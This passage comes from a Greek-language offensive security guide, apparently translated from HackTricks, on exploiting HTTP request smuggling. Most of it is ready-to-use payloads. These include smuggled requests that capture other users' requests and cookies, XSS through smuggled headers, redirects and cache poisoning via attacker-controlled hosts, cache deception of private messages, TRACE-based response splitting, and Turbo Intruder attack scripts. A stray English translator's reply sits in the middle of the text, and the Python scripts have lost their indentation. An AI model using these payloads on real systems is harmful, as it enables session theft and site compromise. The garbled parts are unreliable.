### Καταγραφή αιτημάτων άλλων χρηστών <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Είναι εφικτό να καταγράψετε τα αιτήματα του επόμενου χρήστη προσθέτοντας ένα συγκεκριμένο αίτημα ως τιμή μιας παραμέτρου κατά τη διάρκεια μιας POST ενέργειας. Να πώς μπορεί να επιτευχθεί αυτό:

Προσθέτοντας το παρακάτω αίτημα ως την τιμή μιας παραμέτρου, μπορείτε να αποθηκεύσετε το αίτημα του επόμενου πελάτη:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Σε αυτό το σενάριο, το **comment parameter** προορίζεται για την αποθήκευση του περιεχομένου της ενότητας σχολίων μιας ανάρτησης σε μια δημόσια προσβάσιμη σελίδα. Συνεπώς, το περιεχόμενο του επόμενου request θα εμφανιστεί ως σχόλιο.

Ωστόσο, αυτή η τεχνική έχει περιορισμούς. Γενικά, καταγράφει δεδομένα μόνο μέχρι τον διαχωριστή παραμέτρων που χρησιμοποιείται στο smuggled request. Για υποβολές φορμών URL-encoded, αυτός ο διαχωριστής είναι ο χαρακτήρας `&`. Αυτό σημαίνει ότι το καταγραφόμενο περιεχόμενο από το request του θύματος θα σταματήσει στο πρώτο `&`, το οποίο μπορεί ακόμη και να είναι μέρος του query string.

Επιπλέον, αξίζει να σημειωθεί ότι αυτή η προσέγγιση είναι επίσης εφαρμόσιμη σε ευπάθεια TE.CL. Σε τέτοιες περιπτώσεις, το request πρέπει να τελειώνει με `search=\r\n0`. Ανεξάρτητα από τους χαρακτήρες αλλαγής γραμμής, οι τιμές θα προσαρτηθούν στην παράμετρο search.

### Χρήση HTTP request smuggling για εκμετάλλευση του reflected XSS

Το HTTP Request Smuggling μπορεί να αξιοποιηθεί για την εκμετάλλευση ιστοσελίδων ευάλωτων σε **Reflected XSS**, προσφέροντας σημαντικά πλεονεκτήματα:

- Η αλληλεπίδραση με τους στοχευόμενους χρήστες **δεν απαιτείται**.
- Επιτρέπει την εκμετάλλευση του XSS σε μέρη του request που είναι **κανονικά απρόσιτα**, όπως τα HTTP request headers.

Σε σενάρια όπου μια ιστοσελίδα είναι ευάλωτη σε Reflected XSS μέσω του User-Agent header, το ακόλουθο payload δείχνει πώς να εκμεταλλευτείτε αυτή την ευπάθεια:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Αυτό το payload έχει δομή για να εκμεταλλευτεί την ευπάθεια ως εξής:

1. Εκκίνηση ενός `POST` request, φαινομενικά τυπικού, με header `Transfer-Encoding: chunked` για να υποδείξει την έναρξη του smuggling.
2. Ακολουθεί ένα `0`, που σηματοδοτεί το τέλος του chunked message body.
3. Στη συνέχεια, εισάγεται ένα smuggled `GET` request, όπου το header `User-Agent` εγχέεται με ένα script, `<script>alert(1)</script>`, προκαλώντας το XSS όταν ο server επεξεργάζεται αυτό το επακόλουθο request.

Με την παραποίηση του `User-Agent` μέσω smuggling, το payload παρακάμπτει τους κανονικούς περιορισμούς των requests, εκμεταλλευόμενο έτσι την Reflected XSS ευπάθεια με έναν μη τυπικό αλλά αποτελεσματικό τρόπο.

#### HTTP/0.9

> [!CAUTION]
> Σε περίπτωση που το περιεχόμενο του χρήστη αντανακλάται σε μια απάντηση με **`Content-type`** όπως **`text/plain`**, αποτρέποντας την εκτέλεση του XSS. Αν ο server υποστηρίζει **HTTP/0.9 ίσως είναι δυνατόν να παρακαμφθεί αυτό**!

Η έκδοση HTTP/0.9 προϋπήρχε της 1.0 και χρησιμοποιεί μόνο ρήματα **GET** και **δεν** απαντά με **headers**, μόνο το body.

Στο [**this writeup**](https://mizu.re/post/twisty-python), αυτό καταχράστηκε μέσω request smuggling και ενός **vulnerable endpoint που θα απαντήσει με την είσοδο του χρήστη** για να smuggle ένα request με HTTP/0.9. Η παράμετρος που θα αντανακλάται στην απάντηση περιείχε μια **ψεύτικη HTTP/1.1 response (με headers και body)**, οπότε η απάντηση θα περιείχε έγκυρο εκτελέσιμο JS κώδικα με `Content-Type` `text/html`.

### Εκμετάλλευση ανακατευθύνσεων εντός του site με HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Οι εφαρμογές συχνά κάνουν redirect από ένα URL σε άλλο χρησιμοποιώντας το hostname από το `Host` header στο URL του redirect. Αυτό είναι συνηθισμένο σε web servers όπως Apache και IIS. Για παράδειγμα, το αίτημα για έναν φάκελο χωρίς trailing slash οδηγεί σε redirect για να προστεθεί το slash:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Έχει ως αποτέλεσμα:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Παρόλο που φαίνεται ακίνδυνη, αυτή η συμπεριφορά μπορεί να χειραγωγηθεί χρησιμοποιώντας το HTTP request smuggling για να ανακατευθύνει τους χρήστες σε έναν εξωτερικό ιστότοπο. Για παράδειγμα:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Αυτό το smuggled request θα μπορούσε να προκαλέσει το επόμενο επεξεργασμένο αίτημα χρήστη να ανακατευθυνθεί σε έναν ιστότοπο που ελέγχεται από τον επιτιθέμενο:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Έχει ως αποτέλεσμα:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
Σε αυτό το σενάριο, το αίτημα ενός χρήστη για ένα αρχείο JavaScript υποκλέπτεται. Ο επιτιθέμενος μπορεί δυνητικά να συμβιβάσει τον χρήστη σερβίροντας κακόβουλο JavaScript ως απάντηση.

### Εκμετάλλευση Web Cache Poisoning μέσω HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web cache poisoning μπορεί να εκτελεστεί αν οποιοδήποτε στοιχείο της **front-end υποδομής αποθηκεύει περιεχόμενο**, συνήθως για βελτίωση της απόδοσης. Με την παραποίηση της απάντησης του server, είναι δυνατόν να **poison the cache**.

Προηγουμένως, παρατηρήσαμε πώς οι απαντήσεις του server μπορούν να αλλαχθούν ώστε να επιστρέψουν σφάλμα 404 (ανατρέξτε στα [Basic Examples](#basic-examples)). Ομοίως, είναι εφικτό να ξεγελάσετε τον server ώστε να παραδώσει το περιεχόμενο του `/index.html` ως απάντηση σε αίτημα για `/static/include.js`. Ως αποτέλεσμα, το περιεχόμενο του `/static/include.js` αντικαθίσταται στην cache με εκείνο του `/index.html`, καθιστώντας το `/static/include.js` μη προσβάσιμο στους χρήστες, κάτι που ενδέχεται να οδηγήσει σε Denial of Service (DoS).

Αυτή η τεχνική γίνεται ιδιαίτερα ισχυρή αν ανακαλυφθεί μια **Open Redirect vulnerability** ή αν υπάρχει **on-site redirect to an open redirect**. Τέτοιες ευπάθειες μπορούν να εκμεταλλευτούν ώστε να αντικατασταθεί το αποθηκευμένο στην cache περιεχόμενο του `/static/include.js` με ένα script υπό τον έλεγχο του επιτιθέμενου, ουσιαστικά επιτρέποντας μια εκτεταμένη Cross-Site Scripting (XSS) επίθεση εναντίον όλων των clients που ζητούν το ενημερωμένο `/static/include.js`.

Παρακάτω ακολουθεί μια απεικόνιση της εκμετάλλευσης του **cache poisoning combined with an on-site redirect to open redirect**. Ο στόχος είναι να αλλαχθεί το περιεχόμενο της cache του `/static/include.js` ώστε να εξυπηρετεί JavaScript κώδικα υπό τον έλεγχο του επιτιθέμενου:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Σημειώστε το ενσωματωμένο αίτημα που στοχεύει το `/post/next?postId=3`. Αυτό το αίτημα θα ανακατευθυνθεί στο `/post?postId=4`, χρησιμοποιώντας την τιμή του **Host header** για να προσδιορίσει τον domain. Αλλάζοντας το **Host header**, ο επιτιθέμενος μπορεί να ανακατευθύνει το αίτημα στο δικό του domain (**on-site redirect to open redirect**).

Μετά από επιτυχή **socket poisoning**, πρέπει να ξεκινήσει ένα **GET request** για το `/static/include.js`. Αυτό το αίτημα θα μολυνθεί από το προηγούμενο αίτημα **on-site redirect to open redirect** και θα φέρει το περιεχόμενο του script που ελέγχεται από τον επιτιθέμενο.

Στη συνέχεια, οποιοδήποτε αίτημα για το `/static/include.js` θα επιστρέφει το αποθηκευμένο (cached) περιεχόμενο του script του επιτιθέμενου, εκτοξεύοντας ουσιαστικά μια ευρεία επίθεση XSS.

### Χρήση HTTP request smuggling για web cache deception <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **What is the difference between web cache poisoning and web cache deception?**
>
> - In **web cache poisoning**, the attacker causes the application to store some malicious content in the cache, and this content is served from the cache to other application users.
> - In **web cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the cache, and the attacker then retrieves this content from the cache.

Ο επιτιθέμενος δημιουργεί ένα smuggled request που ανακτά ευαίσθητο περιεχόμενο συγκεκριμένου χρήστη. Εξετάστε το ακόλουθο παράδειγμα:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Εάν αυτό το smuggled request δηλητηριάσει ένα cache entry προοριζόμενο για static content (π.χ., `/someimage.png`), τα ευαίσθητα δεδομένα του θύματος από το `/private/messages` μπορεί να αποθηκευτούν στο cache entry του static content. Κατά συνέπεια, ο επιτιθέμενος θα μπορούσε ενδεχομένως να ανακτήσει αυτά τα αποθηκευμένα στην cache ευαίσθητα δεδομένα.

### Κατάχρηση του TRACE μέσω HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In this post**](https://portswigger.net/research/trace-desync-attack) προτείνεται ότι εάν ο διακομιστής έχει ενεργοποιημένη τη μέθοδο TRACE, θα μπορούσε να είναι εφικτό να την καταχραστεί κάποιος με HTTP Request Smuggling. Αυτό συμβαίνει επειδή αυτή η μέθοδος θα ανακλά οποιαδήποτε κεφαλίδα (header) αποσταλεί στον διακομιστή ως μέρος του σώματος της απάντησης. Για παράδειγμα:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Please paste the README.md content you want translated. I will return the Markdown with the English → Greek translation, following your rules.
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Ένα παράδειγμα για το πώς να εκμεταλλευτείτε αυτή τη συμπεριφορά θα ήταν να **smuggle πρώτα ένα HEAD request**. Αυτό το request θα απαντηθεί μόνο με τα **headers** ενός GET request (**`Content-Type`** μεταξύ αυτών). Και να smuggle **αμέσως μετά το HEAD ένα TRACE request**, το οποίο θα είναι **αντικατοπτρίζοντας τα αποσταλμένα δεδομένα**.\
Καθώς η απάντηση του HEAD θα περιέχει ένα header `Content-Length`, η **απάντηση του TRACE request θα θεωρηθεί ως το body της απάντησης του HEAD, συνεπώς αντικατοπτρίζοντας αυθαίρετα δεδομένα** στην απάντηση.\
Αυτή η απάντηση θα σταλεί στο επόμενο request πάνω στη σύνδεση, οπότε αυτό θα μπορούσε να **χρησιμοποιηθεί σε ένα cached JS αρχείο για παράδειγμα για την εισαγωγή αυθαίρετου JS κώδικα**.

### Κατάχρηση του TRACE μέσω HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Συνιστάται να ακολουθήσετε [**this post**](https://portswigger.net/research/trace-desync-attack) για έναν άλλο τρόπο κατάχρησης της μεθόδου TRACE. Όπως αναφέρθηκε, με το smuggling ενός HEAD request και ενός TRACE request είναι δυνατό να **ελεγχθούν κάποια αντικατοπτριζόμενα δεδομένα** στην απάντηση του HEAD request. Το μήκος του body του HEAD request υποδεικνύεται ουσιαστικά από το header `Content-Length` και σχηματίζεται από την απάντηση στο TRACE request.

Συνεπώς, η νέα ιδέα είναι ότι, γνωρίζοντας αυτό το `Content-Length` και τα δεδομένα που παρέχονται στην απάντηση του TRACE, είναι δυνατό να κάνετε ώστε η απάντηση του TRACE να περιέχει μια έγκυρη HTTP response μετά το τελευταίο byte που ορίζεται από το `Content-Length`, επιτρέποντας σε έναν επιτιθέμενο να ελέγξει πλήρως το request για την επόμενη απάντηση (που θα μπορούσε να χρησιμοποιηθεί για να πραγματοποιήσει cache poisoning).

Example:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Θα δημιουργήσει αυτές τις responses (παρατήρησε πώς η HEAD response έχει ένα Content-Length που κάνει την TRACE response μέρος του HEAD body και, μόλις το HEAD Content-Length τελειώσει, μια έγκυρη HTTP response smuggled):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### Οπλοποίηση του HTTP Request Smuggling με HTTP Response Desynchronisation

Έχετε βρει κάποια ευπάθεια HTTP Request Smuggling και δεν ξέρετε πώς να την εκμεταλλευτείτε; Δοκιμάστε αυτήν την άλλη μέθοδο εκμετάλλευσης:


{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### Άλλες Τεχνικές HTTP Request Smuggling

- Browser HTTP Request Smuggling (Client Side)


{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling in HTTP/2 Downgrades


{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Turbo intruder scripts

### CL.TE

Από [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Από: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Εργαλεία

- HTTP Hacker (Burp BApp Store) – οπτικοποιεί την concatenation/framing και τη χαμηλού επιπέδου συμπεριφορά του HTTP
- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater Custom Action "Smuggling or pipelining?"
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Αυτό το εργαλείο είναι grammar-based HTTP Fuzzer χρήσιμο για την ανίχνευση περίεργων ασυνεπειών στο request smuggling.

## Αναφορές

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- Προσοχή στα ψευδώς‑θετικά: πώς να διακρίνετε το HTTP pipelining από το request smuggling – [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://http1mustdie.com/](https://http1mustdie.com/)
- Browser‑Powered Desync Attacks – [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- PortSwigger Academy – client‑side desync – [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)
- [https://portswigger.net/research/http1-must-die](https://portswigger.net/research/http1-must-die)


{{#include ../../banners/hacktricks-training.md}}
